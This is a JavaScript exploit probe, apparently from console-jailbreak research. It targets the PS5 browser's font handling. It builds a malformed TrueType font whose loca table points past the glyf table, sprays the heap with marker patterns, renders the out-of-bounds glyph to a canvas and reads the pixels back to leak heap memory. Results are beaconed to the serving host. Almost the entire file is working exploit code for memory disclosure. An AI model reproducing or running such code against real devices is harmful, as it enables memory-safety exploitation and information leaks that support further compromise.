// p260 — Font loca OOB info leak via canvas pixel readback
//
// PS5 font system confirmed permissive (V190A: upem=0, locafmt=0xFF accepted).
// Strategy: TrueType font with loca entry pointing past glyf table end.
// When rendered, font system reads heap memory as glyph outlines.
// Canvas getImageData reveals heap contents as pixel patterns.
//
// Tests multiple OOB offsets: +32, +64, +128, +256, +512, +1024
// Beacon prefix: V260-

(function() {
  var HOST = location.protocol + '//' + location.hostname + ':' + (location.port || 80);
  function B(tag, body) {
    try {
      var x = new XMLHttpRequest();
      x.open('POST', HOST + '/beacon/V260-' + tag + '?t=' + Date.now(), false);
      x.send(body || '');
    } catch(e) {}
  }

  B('BOOT');

  // ---- TrueType font builder ----
  function u16(v) { return [(v >> 8) & 0xFF, v & 0xFF]; }
  function u32(v) { return [(v >> 24) & 0xFF, (v >> 16) & 0xFF, (v >> 8) & 0xFF, v & 0xFF]; }
  function s16(v) { if (v < 0) v += 0x10000; return u16(v); }
  function pad4(arr) { while (arr.length % 4) arr.push(0); return arr; }
  function tag(s) { return [s.charCodeAt(0), s.charCodeAt(1), s.charCodeAt(2), s.charCodeAt(3)]; }
  function checksum(bytes) {
    var sum = 0;
    var padded = bytes.slice();
    while (padded.length % 4) padded.push(0);
    for (var i = 0; i < padded.length; i += 4) {
      sum = (sum + ((padded[i] << 24) | (padded[i+1] << 16) | (padded[i+2] << 8) | padded[i+3])) >>> 0;
    }
    return sum;
  }

  // Build a simple glyph (square outline for notdef)
  function makeNotdefGlyph() {
    var g = [];
    // numberOfContours = 1
    g = g.concat(s16(1));
    // xMin=50 yMin=0 xMax=450 yMax=700
    g = g.concat(s16(50), s16(0), s16(450), s16(700));
    // endPtsOfContours[0] = 3 (4 points for a rectangle)
    g = g.concat(u16(3));
    // instructionLength = 0
    g = g.concat(u16(0));
    // flags: 4 points, all on-curve, x/y as 1-byte deltas
    // flag bits: 0x01=onCurve, 0x02=xShort, 0x04=xPositive, 0x10=yShort, 0x20=yPositive
    // P0: (50,0)    → xShort+positive=0x06, yShort=0x10 (y=0 needs special: 0x10+0x20=zero)
    // P1: (450,0)   → dx=400 (2-byte), dy=0
    // P2: (450,700)  → dx=0, dy=700 (2-byte)
    // P3: (50,700)   → dx=-400 (2-byte), dy=0

    // Simpler: use 2-byte coordinates for all (no short flags)
    // flags: onCurve only = 0x01 for each
    g.push(0x01, 0x01, 0x01, 0x01);
    // x-coordinates (2-byte each): 50, 450, 450, 50
    g = g.concat(s16(50), s16(400), s16(0), s16(-400));
    // y-coordinates (2-byte each): 0, 0, 700, 700
    g = g.concat(s16(0), s16(0), s16(700), s16(0));
    return g;
  }

  function buildFont(oobOffset, familyName) {
    var numGlyphs = 2; // .notdef + glyph1 (OOB)
    var notdef = makeNotdefGlyph();
    var glyfData = pad4(notdef.slice());
    var glyfLen = glyfData.length;

    // loca table (long format, numGlyphs+1 entries)
    // glyph 0: offset 0 (notdef)
    // glyph 1: offset = glyfLen + oobOffset (OOB!)
    // sentinel: same as glyph 1 end (glyph1 length = 128 bytes of "OOB data")
    var locaData = [];
    locaData = locaData.concat(u32(0)); // glyph 0 start
    locaData = locaData.concat(u32(glyfLen + oobOffset)); // glyph 1 start (OOB)
    locaData = locaData.concat(u32(glyfLen + oobOffset + 128)); // sentinel
    locaData = pad4(locaData);

    // head table
    var head = [];
    head = head.concat(u16(1), u16(0)); // version 1.0
    head = head.concat(u16(1), u16(0)); // fontRevision 1.0
    head = head.concat(u32(0)); // checksumAdjustment (fix later)
    head = head.concat(u32(0x5F0F3CF5)); // magicNumber
    head = head.concat(u16(0x000B)); // flags
    head = head.concat(u16(1024)); // unitsPerEm
    head = head.concat(u32(0), u32(0)); // created (8 bytes)
    head = head.concat(u32(0), u32(0)); // modified (8 bytes)
    head = head.concat(s16(0), s16(0), s16(1024), s16(1024)); // xMin yMin xMax yMax
    head = head.concat(u16(0)); // macStyle
    head = head.concat(u16(8)); // lowestRecPPEM
    head = head.concat(s16(2)); // fontDirectionHint
    head = head.concat(s16(1)); // indexToLocFormat = 1 (long)
    head = head.concat(s16(0)); // glyphDataFormat
    head = pad4(head);

    // hhea table
    var hhea = [];
    hhea = hhea.concat(u16(1), u16(0)); // version
    hhea = hhea.concat(s16(800)); // ascender
    hhea = hhea.concat(s16(-200)); // descender
    hhea = hhea.concat(s16(0)); // lineGap
    hhea = hhea.concat(u16(1024)); // advanceWidthMax
    hhea = hhea.concat(s16(0)); // minLeftSideBearing
    hhea = hhea.concat(s16(0)); // minRightSideBearing
    hhea = hhea.concat(s16(1024)); // xMaxExtent
    hhea = hhea.concat(s16(1), s16(0)); // caretSlopeRise/Run
    hhea = hhea.concat(s16(0)); // caretOffset
    hhea = hhea.concat(s16(0), s16(0), s16(0), s16(0)); // reserved
    hhea = hhea.concat(s16(0)); // metricDataFormat
    hhea = hhea.concat(u16(numGlyphs)); // numberOfHMetrics
    hhea = pad4(hhea);

    // hmtx table
    var hmtx = [];
    for (var i = 0; i < numGlyphs; i++) {
      hmtx = hmtx.concat(u16(512)); // advanceWidth
      hmtx = hmtx.concat(s16(0)); // lsb
    }
    hmtx = pad4(hmtx);

    // maxp table
    var maxp = [];
    maxp = maxp.concat(u16(1), u16(0)); // version 1.0
    maxp = maxp.concat(u16(numGlyphs)); // numGlyphs
    maxp = maxp.concat(u16(4)); // maxPoints
    maxp = maxp.concat(u16(1)); // maxContours
    maxp = maxp.concat(u16(0)); // maxCompositePoints
    maxp = maxp.concat(u16(0)); // maxCompositeContours
    maxp = maxp.concat(u16(1)); // maxZones
    maxp = maxp.concat(u16(0)); // maxTwilightPoints
    maxp = maxp.concat(u16(0)); // maxStorage
    maxp = maxp.concat(u16(0)); // maxFunctionDefs
    maxp = maxp.concat(u16(0)); // maxInstructionDefs
    maxp = maxp.concat(u16(0)); // maxStackElements
    maxp = maxp.concat(u16(0)); // maxSizeOfInstructions
    maxp = maxp.concat(u16(0)); // maxComponentElements
    maxp = maxp.concat(u16(0)); // maxComponentDepth
    maxp = pad4(maxp);

    // cmap table: format 4, map 0x41 ('A') → glyph 1
    var cmapSubtable = [];
    // Format 4 header
    var segCount = 2; // one real segment + sentinel
    var segCountX2 = segCount * 2;
    var searchRange = 4; // 2^floor(log2(segCount))*2
    var entrySelector = 1;
    var rangeShift = 0;
    cmapSubtable = cmapSubtable.concat(u16(4)); // format
    cmapSubtable = cmapSubtable.concat(u16(0)); // length placeholder
    cmapSubtable = cmapSubtable.concat(u16(0)); // language
    cmapSubtable = cmapSubtable.concat(u16(segCountX2));
    cmapSubtable = cmapSubtable.concat(u16(searchRange));
    cmapSubtable = cmapSubtable.concat(u16(entrySelector));
    cmapSubtable = cmapSubtable.concat(u16(rangeShift));
    // endCode: 0x41, 0xFFFF
    cmapSubtable = cmapSubtable.concat(u16(0x41), u16(0xFFFF));
    cmapSubtable = cmapSubtable.concat(u16(0)); // reservedPad
    // startCode: 0x41, 0xFFFF
    cmapSubtable = cmapSubtable.concat(u16(0x41), u16(0xFFFF));
    // idDelta: 1-0x41=-64 (maps 0x41→1), 1
    cmapSubtable = cmapSubtable.concat(s16(1 - 0x41), s16(1));
    // idRangeOffset: 0, 0
    cmapSubtable = cmapSubtable.concat(u16(0), u16(0));
    // Fix length
    var stLen = cmapSubtable.length;
    cmapSubtable[2] = (stLen >> 8) & 0xFF;
    cmapSubtable[3] = stLen & 0xFF;

    var cmap = [];
    cmap = cmap.concat(u16(0)); // version
    cmap = cmap.concat(u16(1)); // numTables
    // encoding record: platformID=3 (Windows), encodingID=1 (Unicode BMP)
    cmap = cmap.concat(u16(3), u16(1), u32(12)); // offset to subtable
    cmap = cmap.concat(cmapSubtable);
    cmap = pad4(cmap);

    // name table (minimal)
    var nameStr = [];
    for (var c = 0; c < familyName.length; c++) {
      nameStr.push(0, familyName.charCodeAt(c));
    }
    var nameRec = function(nameID) {
      return [].concat(u16(3), u16(1), u16(0x0409), u16(nameID), u16(nameStr.length), u16(0));
    };
    var nameTable = [];
    nameTable = nameTable.concat(u16(0)); // format
    nameTable = nameTable.concat(u16(4)); // count (4 name records)
    var storageOff = 6 + 4 * 12;
    nameTable = nameTable.concat(u16(storageOff));
    nameTable = nameTable.concat(nameRec(1)); // family
    nameTable = nameTable.concat(nameRec(2)); // subfamily
    nameTable = nameTable.concat(nameRec(4)); // full name
    nameTable = nameTable.concat(nameRec(6)); // postscript name
    nameTable = nameTable.concat(nameStr);
    nameTable = pad4(nameTable);

    // post table (minimal)
    var post = [];
    post = post.concat(u16(3), u16(0)); // version 3.0
    post = post.concat(u32(0)); // italicAngle
    post = post.concat(s16(-100)); // underlinePosition
    post = post.concat(s16(50)); // underlineThickness
    post = post.concat(u32(0)); // isFixedPitch
    post = post.concat(u32(0), u32(0), u32(0), u32(0)); // memory
    post = pad4(post);

    // OS/2 table (minimal)
    var os2 = [];
    os2 = os2.concat(u16(4)); // version
    os2 = os2.concat(s16(500)); // xAvgCharWidth
    os2 = os2.concat(u16(400)); // usWeightClass
    os2 = os2.concat(u16(5)); // usWidthClass
    os2 = os2.concat(u16(0)); // fsType
    os2 = os2.concat(s16(0), s16(0), s16(0), s16(0), s16(0)); // subscript
    os2 = os2.concat(s16(0), s16(0), s16(0), s16(0), s16(0)); // superscript
    os2 = os2.concat(s16(0), s16(0)); // strikeout
    os2 = os2.concat(s16(0)); // sFamilyClass
    os2 = os2.concat([0,0,0,0,0,0,0,0,0,0]); // panose (10 bytes)
    os2 = os2.concat(u32(0), u32(0), u32(0), u32(0)); // unicode ranges
    os2 = os2.concat(tag('    ')); // achVendID
    os2 = os2.concat(u16(0x0040)); // fsSelection
    os2 = os2.concat(u16(0x0020), u16(0xFFFF)); // char range
    os2 = os2.concat(s16(800)); // sTypoAscender
    os2 = os2.concat(s16(-200)); // sTypoDescender
    os2 = os2.concat(s16(0)); // sTypoLineGap
    os2 = os2.concat(u16(800)); // usWinAscent
    os2 = os2.concat(u16(200)); // usWinDescent
    os2 = os2.concat(u32(0), u32(0)); // code page ranges
    os2 = os2.concat(s16(0)); // sxHeight
    os2 = os2.concat(s16(700)); // sCapHeight
    os2 = os2.concat(u16(0)); // usDefaultChar
    os2 = os2.concat(u16(0x20)); // usBreakChar
    os2 = os2.concat(u16(1)); // usMaxContext
    os2 = pad4(os2);

    // Assemble font
    var tables = [
      { tag: 'OS/2', data: os2 },
      { tag: 'cmap', data: cmap },
      { tag: 'glyf', data: glyfData },
      { tag: 'head', data: head },
      { tag: 'hhea', data: hhea },
      { tag: 'hmtx', data: hmtx },
      { tag: 'loca', data: locaData },
      { tag: 'maxp', data: maxp },
      { tag: 'name', data: nameTable },
      { tag: 'post', data: post }
    ];
    tables.sort(function(a, b) { return a.tag < b.tag ? -1 : 1; });

    var numTables = tables.length;
    var headerSize = 12 + numTables * 16;
    var offset = headerSize;
    for (var i = 0; i < tables.length; i++) {
      tables[i].offset = offset;
      offset += tables[i].data.length;
    }

    // Offset table
    var entSel = Math.floor(Math.log(numTables) / Math.LN2);
    var srch = Math.pow(2, entSel) * 16;
    var font = [];
    font = font.concat(u32(0x00010000)); // sfVersion
    font = font.concat(u16(numTables));
    font = font.concat(u16(srch));
    font = font.concat(u16(entSel));
    font = font.concat(u16(numTables * 16 - srch));

    for (var i = 0; i < tables.length; i++) {
      font = font.concat(tag(tables[i].tag));
      font = font.concat(u32(checksum(tables[i].data)));
      font = font.concat(u32(tables[i].offset));
      font = font.concat(u32(tables[i].data.length));
    }
    for (var i = 0; i < tables.length; i++) {
      font = font.concat(tables[i].data);
    }

    return new Uint8Array(font).buffer;
  }

  // ---- Canvas pixel analysis ----
  function analyzePixels(ctx, w, h) {
    var data = ctx.getImageData(0, 0, w, h).data;
    var nonZero = 0;
    var nonZeroAlpha = 0;
    var first16 = [];
    for (var i = 0; i < data.length; i += 4) {
      var r = data[i], g = data[i+1], b = data[i+2], a = data[i+3];
      if (r || g || b || a) {
        nonZero++;
        if (a > 0) nonZeroAlpha++;
        if (first16.length < 16) {
          var px = (i / 4) % w;
          var py = Math.floor(i / 4 / w);
          first16.push(px + ',' + py + '=' + r.toString(16) + g.toString(16) + b.toString(16) + a.toString(16));
        }
      }
    }
    return { nonZero: nonZero, nonZeroAlpha: nonZeroAlpha, first16: first16 };
  }

  // Hash first 1024 pixel values for uniqueness detection
  function pixelHash(ctx, w, h) {
    var data = ctx.getImageData(0, 0, Math.min(w, 128), Math.min(h, 128)).data;
    var hash = 0;
    for (var i = 0; i < data.length && i < 4096; i++) {
      hash = ((hash << 5) - hash + data[i]) | 0;
    }
    return (hash >>> 0).toString(16);
  }

  // ---- Test runner ----
  var offsets = [32, 64, 128, 256, 512, 1024];
  var CW = 256, CH = 256;
  var testIdx = 0;

  function runTest() {
    if (testIdx >= offsets.length) {
      B('ALL-DONE', offsets.length + ' offsets tested');
      return;
    }

    var oob = offsets[testIdx];
    var name = 'OOB260_' + oob + '_' + Math.random().toString(36).slice(2, 6);
    var label = 'T' + testIdx + '-OOB' + oob;

    try {
      var buf = buildFont(oob, name);
      B(label + '-BUILT', buf.byteLength + 'B');

      var face = new FontFace(name, buf);
      face.load().then(function(loaded) {
        B(label + '-LOADED');
        document.fonts.add(loaded);

        var canvas = document.createElement('canvas');
        canvas.width = CW;
        canvas.height = CH;
        var ctx = canvas.getContext('2d');

        // Clear canvas
        ctx.clearRect(0, 0, CW, CH);

        // Render the OOB glyph ('A' → glyph 1)
        ctx.fillStyle = '#000000';
        ctx.font = '200px "' + name + '"';
        ctx.fillText('A', 10, 200);

        var result = analyzePixels(ctx, CW, CH);
        var hash = pixelHash(ctx, CW, CH);

        B(label + '-PX', 'nz=' + result.nonZero + ' a=' + result.nonZeroAlpha + ' h=' + hash);

        if (result.nonZero > 0) {
          B(label + '-PIXELS', result.first16.join('|'));
        }

        // Also render notdef (control) — render a char NOT in cmap
        ctx.clearRect(0, 0, CW, CH);
        ctx.fillText('Z', 10, 200);
        var ctrl = analyzePixels(ctx, CW, CH);
        var ctrlHash = pixelHash(ctx, CW, CH);
        B(label + '-CTRL', 'nz=' + ctrl.nonZero + ' h=' + ctrlHash);

        // If OOB had pixels and they differ from control, that's interesting
        if (result.nonZero > 0 && hash !== ctrlHash) {
          B(label + '-DIFF', 'OOB pixels differ from control');
        }

        // Render at different sizes for more data
        if (result.nonZero > 0) {
          ctx.clearRect(0, 0, CW, CH);
          ctx.font = '64px "' + name + '"';
          for (var row = 0; row < 4; row++) {
            ctx.fillText('AAAA', 2, 60 + row * 64);
          }
          var multi = analyzePixels(ctx, CW, CH);
          B(label + '-MULTI', 'nz=' + multi.nonZero + ' a=' + multi.nonZeroAlpha);
        }

        // Remove font and continue
        try { document.fonts.delete(loaded); } catch(e) {}
        testIdx++;
        setTimeout(runTest, 200);

      }).catch(function(err) {
        B(label + '-REJECT', (err.message || err).toString().slice(0, 80));
        testIdx++;
        setTimeout(runTest, 200);
      });

    } catch(e) {
      B(label + '-ERR', (e.message || e).toString().slice(0, 80));
      testIdx++;
      setTimeout(runTest, 200);
    }
  }

  // ---- Heap spray before font loading ----
  // Fill heap with pattern data so OOB reads hit known values
  B('SPRAY-START');
  var sprays = [];
  for (var i = 0; i < 200; i++) {
    var ab = new ArrayBuffer(4096);
    var v = new Uint32Array(ab);
    for (var j = 0; j < v.length; j++) {
      v[j] = 0xDEAD0000 | (i << 8) | (j & 0xFF);
    }
    sprays.push(ab);
  }
  B('SPRAY-200');

  // Start tests
  setTimeout(runTest, 100);
})();
